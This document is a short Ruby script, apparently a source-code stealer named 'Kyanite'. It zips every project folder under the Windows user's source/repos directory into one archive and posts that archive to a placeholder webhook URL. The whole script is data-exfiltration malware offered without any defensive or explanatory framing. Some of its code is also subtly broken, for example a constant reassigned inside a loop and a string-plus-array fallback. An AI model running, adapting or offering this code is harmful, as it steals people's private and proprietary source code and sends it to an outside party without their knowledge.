require 'zip'
require 'fileutils'
require 'rest_client'
def generate_random_strings
  strings = []
  5.times do
    string = ''
    8.times do
      string << ('a'..'z').to_a.concat(('A'..'Z').to_a).sample
    end
    strings << string
  end
  return strings
end
def delete_folder_if_exists(folder_path)
  if File.directory?(folder_path)
    puts "Deleting existing folder at #{folder_path}..."
    FileUtils.rm_rf(folder_path)
  end
end
username = ENV['USERNAME']
repos_folder = "C:/Users/#{username}/source/repos"
kyanite_folder = 'KYANITE_SOURCE'
delete_folder_if_exists(kyanite_folder)
kyanite_path = "#{kyanite_folder}"
Dir.mkdir(kyanite_path) unless Dir.exist?(kyanite_path)
Dir.glob("#{repos_folder}/*").select { |f| File.directory?(f) }.each do |folder|
  folder_name = File.basename(folder)
  KyaniteZipUp = "#{kyanite_path}/#{folder_name}.zip"
  begin
    Zip::File.open(KyaniteZipUp, Zip::File::CREATE) do |zipfile|
      Dir.glob("#{folder}/**/*").reject { |f| File.directory?(f) }.each do |file|
        filename = File.basename(file)
        begin
          zipfile.add(filename, file)
        rescue StandardError => e
          zipfile.add(filename, file + generate_random_strings)
        end
      end
    end
  rescue StandardError => e
    puts "Exception Caught #{KyaniteZipUp}: #{e}"
  end
end
def KYANITEZIPAPI(source, destination)
  Zip::File.open(destination, Zip::File::CREATE) do |zipfile|
    Dir.glob(source + '/**/*').each do |file|
      begin
      zipfile.add(file.sub(source + '/', ''), file)
      rescue
        end
    end
  end
end
KYANITEZIPAPI('KYANITE_SOURCE', 'SOURCE_CODE.zip')
RestClient.post('//WEBHOOK//',
                :files => File.new('SOURCE_CODE.zip'))
